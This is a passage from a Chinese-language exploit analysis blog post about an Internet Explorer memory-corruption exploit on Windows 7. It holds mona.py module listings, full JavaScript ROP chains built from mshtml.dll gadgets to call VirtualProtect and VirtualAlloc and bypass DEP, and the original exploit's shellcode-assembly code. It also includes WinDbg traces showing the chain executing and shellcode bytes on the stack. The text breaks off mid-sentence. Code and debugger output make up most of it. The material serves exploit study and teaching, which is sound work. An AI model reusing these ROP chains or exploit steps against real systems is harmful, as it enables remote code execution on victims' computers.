0x77599000 | 0x000c9000 | False  | True    | True  |  True    | True   | 6.1.7601.17514 [USER32.dll] (C:\\Windows\\system32\\USER32.dll)</span><br><span class=\"line\"> 0x70520000 | 0x70528000 | 0x00008000 | False  | True    | True  |  True    | True   | 6.1.7600.16385 [msacm32.drv] (C:\\Windows\\system32\\msacm32.drv)</span><br><span class=\"line\"> 0x76440000 | 0x7645f000 | 0x0001f000 | False  | True    | True  |  True    | True   | 6.1.7601.17514 [IMM32.DLL] (C:\\Windows\\system32\\IMM32.DLL)</span><br><span class=\"line\"> 0x77b30000 | 0x77bab000 | 0x0007b000 | False  | True    | True  |  True    | True   | 6.1.7601.17514 [comdlg32.dll] (C:\\Windows\\system32\\comdlg32.dll)</span><br><span class=\"line\"> 0x6bc20000 | 0x6bc4e000 | 0x0002e000 | False  | True    | True  |  True    | True   | 6.1.7600.16385 [MLANG.dll] (C:\\Windows\\system32\\MLANG.dll)</span><br><span class=\"line\"> 0x71a20000 | 0x71a4a000 | 0x0002a000 | False  | True    | True  |  True    | True   | 3.10.349.0 [msls31.dll] (C:\\Windows\\System32\\msls31.dll)</span><br><span class=\"line\"> 0x75520000 | 0x7555b000 | 0x0003b000 | False  | True    | True  |  True    | True   | 6.1.7600.16385 [rsaenh.dll] (C:\\Windows\\system32\\rsaenh.dll)</span><br><span class=\"line\"> 0x74980000 | 0x74a75000 | 0x000f5000 | False  | True    | True  |  True    | True   | 7.0.7601.17514 [propsys.dll] (C:\\Windows\\system32\\propsys.dll)</span><br><span class=\"line\"> 0x74540000 | 0x74561000 | 0x00021000 | False  | True    | True  |  True    | True   | 6.1.7600.16385 [ntmarta.dll] (C:\\Windows\\system32\\ntmarta.dll)</span><br><span class=\"line\"> 0x704b0000 | 0x704b7000 | 0x00007000 | False  | True    | True  |  True    | True   | 6.1.7600.16385 [midimap.dll] (C:\\Windows\\system32\\midimap.dll)</span><br><span class=\"line\"> 0x74940000 | 0x74980000 | 0x00040000 | False  | True    | True  |  True    | True   | 6.1.7600.16385 [uxtheme.dll] (C:\\Windows\\system32\\uxtheme.dll)</span><br><span class=\"line\"> 0x73be0000 | 0x73beb000 | 0x0000b000 | False  | True    | True  |  True    | True   | 6.1.7600.16385 [msimtf.dll] (C:\\Windows\\system32\\msimtf.dll)</span><br><span class=\"line\"> 0x77d50000 | 0x77ddf000 | 0x0008f000 | False  | True    | True  |  True    | True   | 6.1.7601.17514 [OLEAUT32.dll] (C:\\Windows\\system32\\OLEAUT32.dll)</span><br><span class=\"line\"> 0x75cd0000 | 0x75cdb000 | 0x0000b000 | False  | True    | True  |  True    | True   | 6.1.7600.16385 [profapi.dll] (C:\\Windows\\system32\\profapi.dll)</span><br><span class=\"line\"> 0x76570000 | 0x771ba000 | 0x00c4a000 | False  | True    | True  |  True    | True   | 6.1.7601.17514 [SHELL32.dll] (C:\\Windows\\system32\\SHELL32.dll)</span><br><span class=\"line\"> 0x764c0000 | 0x76561000 | 0x000a1000 | False  | True    | True  |  True    | True   | 6.1.7601.17514 [RPCRT4.dll] (C:\\Windows\\system32\\RPCRT4.dll)</span><br><span class=\"line\"> 0x760e0000 | 0x76115000 | 0x00035000 | False  | True    | True  |  True    | True   | 6.1.7601.17514 [ws2_32.DLL] (C:\\Windows\\system32\\ws2_32.DLL)</span><br><span class=\"line\"> 0x778a0000 | 0x77923000 | 0x00083000 | False  | True    | True  |  True    | True   | 2001.12.8530.16385 [CLBCatQ.DLL] (C:\\Windows\\system32\\CLBCatQ.DLL)</span><br><span class=\"line\"> 0x74b40000 | 0x74cde000 | 0x0019e000 | False  | True    | True  |  True    | True   | 6.10.7601.17514 [comctl32.dll] (C:\\Windows\\WinSxS\\x86_microsoft.windows.common-controls_6595b64144ccf1df_6.0.7601.17514_none_41e6975e2bd6f2b2\\comctl32.dll)</span><br><span class=\"line\"> 0x70520000 | 0x70528000 | 0x00008000 | False  | True    | True  |  True    | True   | 6.1.7600.16385 [MSACM32.dll] (C:\\Windows\\system32\\msacm32.drv)</span><br><span class=\"line\"> 0x76190000 | 0x76196000 | 0x00006000 | False  | True    | True  |  True    | True   | 6.1.7600.16385 [NSI.dll] (C:\\Windows\\system32\\NSI.dll)</span><br><span class=\"line\"> 0x76120000 | 0x76165000 | 0x00045000 | False  | True    | True  |  True    | True   | 6.1.7601.17514 [WLDAP32.dll] (C:\\Windows\\system32\\WLDAP32.dll)</span><br><span class=\"line\"> 0x772c0000 | 0x7738c000 | 0x000cc000 | False  | True    | True  |  True    | True   | 6.1.7600.16385 [MSCTF.dll] (C:\\Windows\\system32\\MSCTF.dll)</span><br><span class=\"line\"> 0x75e40000 | 0x75e8a000 | 0x0004a000 | False  | True    | True  |  True    | True   | 6.1.7601.17514 [KERNELBASE.dll] (C:\\Windows\\system32\\KERNELBASE.dll)</span><br><span class=\"line\"> 0x75c60000 | 0x75cbf000 | 0x0005f000 | False  | True    | True  |  True    | True   | 6.1.7601.17514 [SXS.DLL] (C:\\Windows\\system32\\SXS.DLL)</span><br><span class=\"line\"> 0x720c0000 | 0x720f2000 | 0x00032000 | False  | True    | True  |  True    | True   | 6.1.7601.17514 [WINMM.dll] (C:\\Windows\\system32\\WINMM.dll)</span><br><span class=\"line\"> 0x75cc0000 | 0x75cce000 | 0x0000e000 | False  | True    | True  |  True    | True   | 6.1.7601.17514 [RpcRtRemote.dll] (C:\\Windows\\system32\\RpcRtRemote.dll)</span><br><span class=\"line\"> 0x75e90000 | 0x75eb7000 | 0x00027000 | False  | True    | True  |  True    | True   | 6.1.7601.17514 [CFGMGR32.dll] (C:\\Windows\\system32\\CFGMGR32.dll)</span><br><span class=\"line\"> 0x77d00000 | 0x77d4e000 | 0x0004e000 | False  | True    | True  |  True    | True   | 6.1.7601.17514 [GDI32.dll] (C:\\Windows\\system32\\GDI32.dll)</span><br><span class=\"line\"> 0x75600000 | 0x75644000 | 0x00044000 | False  | True    | True  |  True    | True   | 6.1.7601.17514 [dnsapi.DLL] (C:\\Windows\\system32\\dnsapi.DLL)</span><br><span class=\"line\"> 0x00130000 | 0x001d6000 | 0x000a6000 | False  | True    | True  |  False   | False  | 8.0.7601.17514 [iexplore.exe] (C:\\Program Files\\Internet Explorer\\iexplore.exe)</span><br><span class=\"line\"> 0x750b0000 | 0x750b9000 | 0x00009000 | False  | True    | True  |  True    | True   | 6.1.7600.16385 [VERSION.dll] (C:\\Windows\\System32\\VERSION.dll)</span><br><span class=\"line\"> 0x77660000 | 0x77700000 | 0x000a0000 | False  | True    | True  |  True    | True   | 6.1.7601.17514 [ADVAPI32.dll] (C:\\Windows\\system32\\ADVAPI32.dll)</span><br><span class=\"line\"> 0x77700000 | 0x7789d000 | 0x0019d000 | False  | True    | True  |  True    | True   | 6.1.7601.17514 [SETUPAPI.dll] (C:\\Windows\\system32\\SETUPAPI.dll)</span><br><span class=\"line\"> 0x73b10000 | 0x73b45000 | 0x00035000 | False  | True    | True  |  True    | False  | 8.0.7601.17514 [IEShims.dll] (C:\\Program Files\\Internet Explorer\\IEShims.dll)</span><br><span class=\"line\"> 0x72a10000 | 0x72a4c000 | 0x0003c000 | False  | True    | True  |  True    | True   | 7.0.0.0 [OLEACC.dll] (C:\\Windows\\system32\\OLEACC.dll)</span><br><span class=\"line\">-----------------------------------------------------------------------------------------------------------------------------------------</span><br><span class=\"line\"></span><br><span class=\"line\">################################################################################</span><br><span class=\"line\"></span><br><span class=\"line\">Register setup for VirtualProtect() :</span><br><span class=\"line\">--------------------------------------------</span><br><span class=\"line\"> EAX = NOP (0x90909090)</span><br><span class=\"line\"> ECX = lpOldProtect (ptr to W address)</span><br><span class=\"line\"> EDX = NewProtect (0x40)</span><br><span class=\"line\"> EBX = dwSize</span><br><span class=\"line\"> ESP = lPAddress (automatic)</span><br><span class=\"line\"> EBP = ReturnTo (ptr to jmp esp)</span><br><span class=\"line\"> ESI = ptr to VirtualProtect()</span><br><span class=\"line\"> EDI = ROP NOP (RETN)</span><br><span class=\"line\"> --- alternative chain ---</span><br><span class=\"line\"> EAX = ptr to &amp;VirtualProtect()</span><br><span class=\"line\"> ECX = lpOldProtect (ptr to W address)</span><br><span class=\"line\"> EDX = NewProtect (0x40)</span><br><span class=\"line\"> EBX = dwSize</span><br><span class=\"line\"> ESP = lPAddress (automatic)</span><br><span class=\"line\"> EBP = POP (skip 4 bytes)</span><br><span class=\"line\"> ESI = ptr to JMP [EAX]</span><br><span class=\"line\"> EDI = ROP NOP (RETN)</span><br><span class=\"line\"> + place ptr to &quot;jmp esp&quot; on stack, below PUSHAD</span><br><span class=\"line\">--------------------------------------------</span><br><span class=\"line\"></span><br><span class=\"line\"></span><br><span class=\"line\">ROP Chain for VirtualProtect() [(XP/2003 Server and up)] :</span><br><span class=\"line\">----------------------------------------------------------</span><br><span class=\"line\"></span><br><span class=\"line\"></span><br><span class=\"line\">*** [ JavaScript ] ***</span><br><span class=\"line\"></span><br><span class=\"line\">  //rop chain generated with mona.py - www.corelan.be</span><br><span class=\"line\">  rop_gadgets = unescape(</span><br><span class=\"line\">    &quot;%u1f9f%u6b72&quot; + // 0x6b721f9f : ,# POP EBP # RETN [mshtml.dll] </span><br><span class=\"line\">    &quot;%u1f9f%u6b72&quot; + // 0x6b721f9f : ,# skip 4 bytes [mshtml.dll]</span><br><span class=\"line\">    &quot;%u0f52%u6b43&quot; + // 0x6b430f52 : ,# POP EAX # RETN [mshtml.dll] </span><br><span class=\"line\">    &quot;%ufdff%uffff&quot; + // 0xfffffdff : ,# Value to negate, will become 0x00000201</span><br><span class=\"line\">    &quot;%u5e7f%u6b6f&quot; + // 0x6b6f5e7f : ,# NEG EAX # RETN [mshtml.dll] </span><br><span class=\"line\">    &quot;%u9a2e%u6b7f&quot; + // 0x6b7f9a2e : ,# XCHG EAX,EBX # RETN [mshtml.dll] </span><br><span class=\"line\">    &quot;%ud820%u6b2e&quot; + // 0x6b2ed820 : ,# POP EAX # RETN [mshtml.dll] </span><br><span class=\"line\">    &quot;%uffc0%uffff&quot; + // 0xffffffc0 : ,# Value to negate, will become 0x00000040</span><br><span class=\"line\">    &quot;%u2269%u6b2d&quot; + // 0x6b2d2269 : ,# NEG EAX # RETN [mshtml.dll] </span><br><span class=\"line\">    &quot;%u8ccd%u6b69&quot; + // 0x6b698ccd : ,# XCHG EAX,EDX # RETN [mshtml.dll] </span><br><span class=\"line\">    &quot;%ucf01%u6b33&quot; + // 0x6b33cf01 : ,# POP ECX # RETN [mshtml.dll] </span><br><span class=\"line\">    &quot;%ub6ce%u6b80&quot; + // 0x6b80b6ce : ,# &amp;Writable location [mshtml.dll]</span><br><span class=\"line\">    &quot;%ueffe%u6b50&quot; + // 0x6b50effe : ,# POP EDI # RETN [mshtml.dll] </span><br><span class=\"line\">    &quot;%u38e2%u6b45&quot; + // 0x6b4538e2 : ,# RETN (ROP NOP) [mshtml.dll]</span><br><span class=\"line\">    &quot;%u5e4f%u6b4f&quot; + // 0x6b4f5e4f : ,# POP ESI # RETN [mshtml.dll] </span><br><span class=\"line\">    &quot;%uc0a3%u6b2d&quot; + // 0x6b2dc0a3 : ,# JMP [EAX] [mshtml.dll]</span><br><span class=\"line\">    &quot;%u0f16%u6b43&quot; + // 0x6b430f16 : ,# POP EAX # RETN [mshtml.dll] </span><br><span class=\"line\">    &quot;%u1348%u6b2d&quot; + // 0x6b2d1348 : ,# ptr to &amp;VirtualProtect() [IAT mshtml.dll]</span><br><span class=\"line\">    &quot;%udfb8%u6b51&quot; + // 0x6b51dfb8 : ,# PUSHAD # RETN [mshtml.dll] </span><br><span class=\"line\">    &quot;%u0b54%u6b32&quot; + // 0x6b320b54 : ,# ptr to &apos;jmp esp&apos; [mshtml.dll]</span><br><span class=\"line\">    &quot;&quot;); //  : </span><br><span class=\"line\"></span><br><span class=\"line\"></span><br><span class=\"line\">--------------------------------------------------------------------------------------------------</span><br><span class=\"line\"></span><br><span class=\"line\"></span><br><span class=\"line\">################################################################################</span><br><span class=\"line\"></span><br><span class=\"line\">Register setup for VirtualAlloc() :</span><br><span class=\"line\">--------------------------------------------</span><br><span class=\"line\"> EAX = NOP (0x90909090)</span><br><span class=\"line\"> ECX = flProtect (0x40)</span><br><span class=\"line\"> EDX = flAllocationType (0x1000)</span><br><span class=\"line\"> EBX = dwSize</span><br><span class=\"line\"> ESP = lpAddress (automatic)</span><br><span class=\"line\"> EBP = ReturnTo (ptr to jmp esp)</span><br><span class=\"line\"> ESI = ptr to VirtualAlloc()</span><br><span class=\"line\"> EDI = ROP NOP (RETN)</span><br><span class=\"line\"> --- alternative chain ---</span><br><span class=\"line\"> EAX = ptr to &amp;VirtualAlloc()</span><br><span class=\"line\"> ECX = flProtect (0x40)</span><br><span class=\"line\"> EDX = flAllocationType (0x1000)</span><br><span class=\"line\"> EBX = dwSize</span><br><span class=\"line\"> ESP = lpAddress (automatic)</span><br><span class=\"line\"> EBP = POP (skip 4 bytes)</span><br><span class=\"line\"> ESI = ptr to JMP [EAX]</span><br><span class=\"line\"> EDI = ROP NOP (RETN)</span><br><span class=\"line\"> + place ptr to &quot;jmp esp&quot; on stack, below PUSHAD</span><br><span class=\"line\">--------------------------------------------</span><br><span class=\"line\">// pushad的顺序如下：EAX、ECX、EDX、EBX、ESP、EBP、ESI、EDI</span><br><span class=\"line\"></span><br><span class=\"line\"></span><br><span class=\"line\">ROP Chain for VirtualAlloc() [(XP/2003 Server and up)] :</span><br><span class=\"line\">--------------------------------------------------------</span><br><span class=\"line\"></span><br><span class=\"line\">*** [ JavaScript ] ***</span><br><span class=\"line\"></span><br><span class=\"line\">  //rop chain generated with mona.py - www.corelan.be</span><br><span class=\"line\">  rop_gadgets = unescape(</span><br><span class=\"line\">    &quot;%uc897%u6b6c&quot; + // 0x6b6cc897 : ,# POP EBP # RETN [mshtml.dll] </span><br><span class=\"line\">    &quot;%uc897%u6b6c&quot; + // 0x6b6cc897 : ,# skip 4 bytes [mshtml.dll]</span><br><span class=\"line\">    &quot;%u0eba%u6b43&quot; + // 0x6b430eba : ,# POP EAX # RETN [mshtml.dll] </span><br><span class=\"line\">    &quot;%uffff%uffff&quot; + // 0xffffffff : ,# Value to negate, will become 0x00000001</span><br><span class=\"line\">    &quot;%u4b13%u6b3d&quot; + // 0x6b3d4b13 : ,# NEG EAX # RETN [mshtml.dll] </span><br><span class=\"line\">    &quot;%ue023%u6b54&quot; + // 0x6b54e023 : ,# XCHG EAX,EBX # RETN [mshtml.dll] </span><br><span class=\"line\">    &quot;%u1c7b%u6b61&quot; + // 0x6b611c7b : ,# POP EAX # RETN [mshtml.dll] </span><br><span class=\"line\">    &quot;%u0ffb%u7ff9&quot; + // 0x7ff90ffb : ,# put delta into eax (-&gt; put 0x00001000 into edx)</span><br><span class=\"line\">    &quot;%u2021%u6b64&quot; + // 0x6b642021 : ,# ADD EAX,80070005 # POP EBP # RETN 0x08 [mshtml.dll] </span><br><span class=\"line\">    &quot;%u4141%u4141&quot; + // 0x41414141 : ,# Filler (compensate)</span><br><span class=\"line\">    &quot;%u8ccd%u6b69&quot; + // 0x6b698ccd : ,# XCHG EAX,EDX # RETN [mshtml.dll] </span><br><span class=\"line\">    &quot;%u4141%u4141&quot; + // 0x41414141 : ,# Filler (RETN offset compensation)</span><br><span class=\"line\">    &quot;%u4141%u4141&quot; + // 0x41414141 : ,# Filler (RETN offset compensation)</span><br><span class=\"line\">    &quot;%u0e1a%u6b43&quot; + // 0x6b430e1a : ,# POP EAX # RETN [mshtml.dll] </span><br><span class=\"line\">    &quot;%uffc0%uffff&quot; + // 0xffffffc0 : ,# Value to negate, will become 0x00000040</span><br><span class=\"line\">    &quot;%u4a30%u6b6f&quot; + // 0x6b6f4a30 : ,# NEG EAX # RETN [mshtml.dll] </span><br><span class=\"line\">    &quot;%u13dc%u6b48&quot; + // 0x6b4813dc : ,# XCHG EAX,ECX # RETN [mshtml.dll] </span><br><span class=\"line\">    &quot;%ud541%u6b32&quot; + // 0x6b32d541 : ,# POP EDI # RETN [mshtml.dll] </span><br><span class=\"line\">    &quot;%u38e2%u6b45&quot; + // 0x6b4538e2 : ,# RETN (ROP NOP) [mshtml.dll]</span><br><span class=\"line\">    &quot;%u8b9c%u6b56&quot; + // 0x6b568b9c : ,# POP ESI # RETN [mshtml.dll] </span><br><span class=\"line\">    &quot;%uc0a3%u6b2d&quot; + // 0x6b2dc0a3 : ,# JMP [EAX] [mshtml.dll]</span><br><span class=\"line\">    &quot;%u0ede%u6b43&quot; + // 0x6b430ede : ,# POP EAX # RETN [mshtml.dll] </span><br><span class=\"line\">    &quot;%u134c%u6b2d&quot; + // 0x6b2d134c : ,# ptr to &amp;VirtualAlloc() [IAT mshtml.dll]</span><br><span class=\"line\">    &quot;%udfb8%u6b51&quot; + // 0x6b51dfb8 : ,# PUSHAD # RETN [mshtml.dll] </span><br><span class=\"line\">    &quot;%u0b54%u6b32&quot; + // 0x6b320b54 : ,# ptr to &apos;jmp esp&apos; [mshtml.dll]</span><br><span class=\"line\">    &quot;&quot;); //  : </span><br><span class=\"line\"></span><br><span class=\"line\"></span><br><span class=\"line\">--------------------------------------------------------------------------------------------------</span><br></pre></td></tr></table></figure>\n<p>首先输出了每个模块的安全机制开启的信息，然后输出支持不同PL的ROP链。</p>\n<p>为了看懂原始exp的ROP链构造，此处有两个tip：</p>\n<ol>\n<li>pushad的压栈顺序：EAX、ECX、EDX、EBX、ESP（初始值）、EBP、ESI、EDI</li>\n<li>popad的出栈顺序：EDI、ESI、EBP、ESP（初始值）、EBX、EDX、ECX、EAX</li>\n</ol>\n<p>看一下原始exp给的rop链吧：</p>\n<figure class=\"highlight javascript\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br><span class=\"line\">23</span><br><span class=\"line\">24</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"comment\">//ROP链中的Gadget地址和参数布局，以实现栈转移和DEP绕过</span></span><br><span class=\"line\">shellcode+= <span class=\"built_in\">unescape</span>(<span class=\"string\">\"%u\"</span>+rop1+<span class=\"string\">\"%u\"</span>+rop2); <span class=\"comment\">// RETN</span></span><br><span class=\"line\">shellcode+= <span class=\"built_in\">unescape</span>(<span class=\"string\">\"%u\"</span>+rop3+<span class=\"string\">\"%u\"</span>+rop4); <span class=\"comment\">// POP EBP</span></span><br><span class=\"line\">shellcode+= <span class=\"built_in\">unescape</span>(<span class=\"string\">\"%u\"</span>+rop5+<span class=\"string\">\"%u\"</span>+rop6); <span class=\"comment\">// XCHG EAX,ESP|call [eax + 8] then goto rop1</span></span><br><span class=\"line\">shellcode+= <span class=\"built_in\">unescape</span>(<span class=\"string\">\"%u\"</span>+rop3+<span class=\"string\">\"%u\"</span>+rop4); <span class=\"comment\">// POP EBP \t</span></span><br><span class=\"line\">shellcode+= <span class=\"built_in\">unescape</span>(<span class=\"string\">\"%u\"</span>+rop3+<span class=\"string\">\"%u\"</span>+rop4); <span class=\"comment\">// POP EBP</span></span><br><span class=\"line\">shellcode+= <span class=\"built_in\">unescape</span>(<span class=\"string\">\"%u\"</span>+rop7+<span class=\"string\">\"%u\"</span>+rop8); <span class=\"comment\">// POP EBX</span></span><br><span class=\"line\">shellcode+= <span class=\"built_in\">unescape</span>(<span class=\"string\">\"%u1024%u0000\"</span>); <span class=\"comment\">// Size 0x00001024</span></span><br><span class=\"line\">shellcode+= <span class=\"built_in\">unescape</span>(<span class=\"string\">\"%u\"</span>+rop9+<span class=\"string\">\"%u\"</span>+rop10); <span class=\"comment\">// POP EDX</span></span><br><span class=\"line\">shellcode+= <span class=\"built_in\">unescape</span>(<span class=\"string\">\"%u0040%u0000\"</span>); <span class=\"comment\">// 0x00000040</span></span><br><span class=\"line\">shellcode+= <span class=\"built_in\">unescape</span>(<span class=\"string\">\"%u\"</span>+rop11+<span class=\"string\">\"%u\"</span>+rop12); <span class=\"comment\">// POP ECX</span></span><br><span class=\"line\">shellcode+= <span class=\"built_in\">unescape</span>(<span class=\"string\">\"%u\"</span>+writable1+<span class=\"string\">\"%u\"</span>+writable2); <span class=\"comment\">// Writable Location</span></span><br><span class=\"line\">shellcode+= <span class=\"built_in\">unescape</span>(<span class=\"string\">\"%u\"</span>+rop13+<span class=\"string\">\"%u\"</span>+rop14); <span class=\"comment\">// POP EDI</span></span><br><span class=\"line\">shellcode+= <span class=\"built_in\">unescape</span>(<span class=\"string\">\"%u\"</span>+rop1+<span class=\"string\">\"%u\"</span>+rop2); <span class=\"comment\">// RET</span></span><br><span class=\"line\">shellcode+= <span class=\"built_in\">unescape</span>(<span class=\"string\">\"%u\"</span>+rop15+<span class=\"string\">\"%u\"</span>+rop16); <span class=\"comment\">// POP ESI</span></span><br><span class=\"line\">shellcode+= <span class=\"built_in\">unescape</span>(<span class=\"string\">\"%u\"</span>+jmpeax1+<span class=\"string\">\"%u\"</span>+jmpeax2); <span class=\"comment\">// JMP EAX</span></span><br><span class=\"line\">shellcode+= <span class=\"built_in\">unescape</span>(<span class=\"string\">\"%u\"</span>+rop17+<span class=\"string\">\"%u\"</span>+rop18); <span class=\"comment\">// POP EAX</span></span><br><span class=\"line\">shellcode+= <span class=\"built_in\">unescape</span>(<span class=\"string\">\"%u\"</span>+vp1+<span class=\"string\">\"%u\"</span>+vp2); <span class=\"comment\">// VirtualProtect()</span></span><br><span class=\"line\">shellcode+= <span class=\"built_in\">unescape</span>(<span class=\"string\">\"%u\"</span>+rop19+<span class=\"string\">\"%u\"</span>+rop20); <span class=\"comment\">// MOV EAX,DWORD PTR DS:[EAX]</span></span><br><span class=\"line\">shellcode+= <span class=\"built_in\">unescape</span>(<span class=\"string\">\"%u\"</span>+rop21+<span class=\"string\">\"%u\"</span>+rop22); <span class=\"comment\">// PUSHAD</span></span><br><span class=\"line\">shellcode+= <span class=\"built_in\">unescape</span>(<span class=\"string\">\"%u\"</span>+rop23+<span class=\"string\">\"%u\"</span>+rop24); <span class=\"comment\">// PUSH ESP</span></span><br><span class=\"line\">shellcode+= <span class=\"built_in\">unescape</span>(<span class=\"string\">\"%u9090%u9090\"</span>); <span class=\"comment\">// NOPs</span></span><br><span class=\"line\">shellcode+= <span class=\"built_in\">unescape</span>(<span class=\"string\">\"%u9090%u9090\"</span>); <span class=\"comment\">// NOPs</span></span><br><span class=\"line\">shellcode+= <span class=\"built_in\">unescape</span>(<span class=\"string\">\"%u9090%u9090\"</span>); <span class=\"comment\">// NOPs</span></span><br></pre></td></tr></table></figure>\n<p>VirtualProtect函数的函数原型如下：</p>\n<figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">BOOL VirtualProtect&#123; </span><br><span class=\"line\">  LPVOID lpAddress, </span><br><span class=\"line\">  DWORD dwsize, </span><br><span class=\"line\">  DWORD flNewProtect, </span><br><span class=\"line\">  PDWORD lpflOldProtect </span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure>\n<p>首先执行一条retn；然后跳过 ；然后pop ebp，跳过下一条pop ebp的指令并将ebp赋值为pop ebp的地址；然后pop ebx，设置为0x1024；pop edx，设置为0x40；pop ecx，设置为一个可写的位置（写入shellcode）；pop edi，将edi设置为一条ret的地址；然后pop esi，将esi设置为jmp eax的地址；然后pop eax，令eax = VirtualProtect的地址。</p>\n<p>总结一下：</p>\n<p>EAX: VirtualProtect的IAT</p>\n<p>ECX: 要修改的地址，注意这个地址是根据之前预测命中的位置计算出来的</p>\n<p>EDX: flProtect(0x40)</p>\n<p>EBX: dwSize(0x1024)</p>\n<p>ESP: 当前栈顶的位置</p>\n<p>EBP: pop ebp;ret</p>\n<p>ESI: jmp eax;ret</p>\n<p>EDI: ret</p>\n<p>然后MOV EAX,DWORD PTR DS:[EAX]会将VirtualProtect函数的真实地址赋值给EAX寄存器，然后执行pushad，将上述寄存器的值压栈。调试跟一下：</p>\n<figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">0:005&gt; dd esp</span><br><span class=\"line\">079f6dcc  6b661041 6b66f920 6b662c60 079f6dec</span><br><span class=\"line\">079f6ddc  00001024 00000040 6bb9fe20 76042341</span><br><span class=\"line\">079f6dec  6b6c3d7e 90909090 90909090 90909090</span><br></pre></td></tr></table></figure>\n<p>pushad后，栈顶是ret指令。连续执行两次ret，此时：</p>\n<figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">0:005&gt; p</span><br><span class=\"line\">eax=76042341 ebx=00001024 ecx=6bb9fe20 edx=00000040 esi=6b66f920 edi=6b661041</span><br><span class=\"line\">eip=6b66f920 esp=079f6dd4 ebp=6b662c60 iopl=0         nv up ei pl nz na po nc</span><br><span class=\"line\">cs=001b  ss=0023  ds=0023  es=0023  fs=003b  gs=0000             efl=00000202</span><br><span class=\"line\">mshtml!_tailMerge_CRYPT32_dll+0xf:</span><br><span class=\"line\">6b66f920 ffe0            jmp     eax &#123;kernel32!VirtualProtectStub (76042341)&#125;</span><br><span class=\"line\">0:005&gt; dd esp</span><br><span class=\"line\">079f6dd4  6b662c60 079f6dec 00001024 00000040</span><br><span class=\"line\">079f6de4  6bb9fe20 76042341 6b6c3d7e 90909090</span><br><span class=\"line\">079f6df4  90909090 90909090 0089e8fc 89600000</span><br><span class=\"line\">079f6e04  64d231e5 8b30528b 528b0c52 28728b14</span><br><span class=\"line\">079f6e14  264ab70f c031ff31 7c613cac c1202c02</span><br><span class=\"line\">079f6e24  c7010dcf 5752f0e2 8b10528b d0013c42</span><br><span class=\"line\">079f6e34  8578408b 014a74c0 488b50d0 20588b18</span><br><span class=\"line\">079f6e44  3ce3d301 8b348b49 ff31d601 c1acc031</span><br></pre></td></tr></table></figure>\n<p>会跳转到jmp eax执行VirtualProtect，参数lpAddress为可写地址0x079f6dec，size为0x1024，flProtect为0x40，函数执行完之后执行pop ebp；ret（注意VirtualProctect函数在返回时执行ret 0x10，自动平衡了堆栈）。</p>\n<figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">0:005&gt; p</span><br><span class=\"line\">eax=00000001 ebx=00001024 ecx=079f6d90 edx=77bf70b4 esi=6b66f920 edi=6b661041</span><br><span class=\"line\">eip=75e622d6 esp=079f6dd4 ebp=6b662c60 iopl=0         nv up ei pl nz na po nc</span><br><span class=\"line\">cs=001b  ss=0023  ds=0023  es=0023  fs=003b  gs=0000             efl=00000202</span><br><span class=\"line\">KERNELBASE!VirtualProtect+0x19:</span><br><span class=\"line\">75e622d6 c21000          ret     10h</span><br><span class=\"line\">0:005&gt; p</span><br><span class=\"line\">eax=00000001 ebx=00001024 ecx=079f6d90 edx=77bf70b4 esi=6b66f920 edi=6b661041</span><br><span class=\"line\">eip=6b662c60 esp=079f6de8 ebp=6b662c60 iopl=0         nv up ei pl nz na po nc</span><br><span class=\"line\">cs=001b  ss=0023  ds=0023  es=0023  fs=003b  gs=0000             efl=00000202</span><br><span class=\"line\">mshtml!StringCchPrintfA+0x58:</span><br><span class=\"line\">6b662c60 5d              pop     ebp</span><br><span class=\"line\">0:005&gt; dd esp</span><br><span class=\"line\">079f6de8  76042341 6b6c3d7e 90909090 90909090</span><br><span class=\"line\">079f6df8  90909090 0089e8fc 89600000 64d231e5</span><br><span class=\"line\">079f6e08  8b30528b 528b0c52 28728b14 264ab70f</span><br><span class=\"line\">079f6e18  c031ff31 7c613cac c1202c02 c7010dcf</span><br><span class=\"line\">079f6e28  5752f0e2 8b10528b d0013c42 8578408b</span><br><span class=\"line\">079f6e38  014a74c0 488b50d0 20588b18 3ce3d301</span><br><span class=\"line\">079f6e48  8b348b49 ff31d601 c1acc031 c7010dcf</span><br><span class=\"line\">079f6e58  f475e038 3bf87d03 e275247d 24588b58</span><br></pre></td></tr></table></figure>\n<p>此时执行最后的push 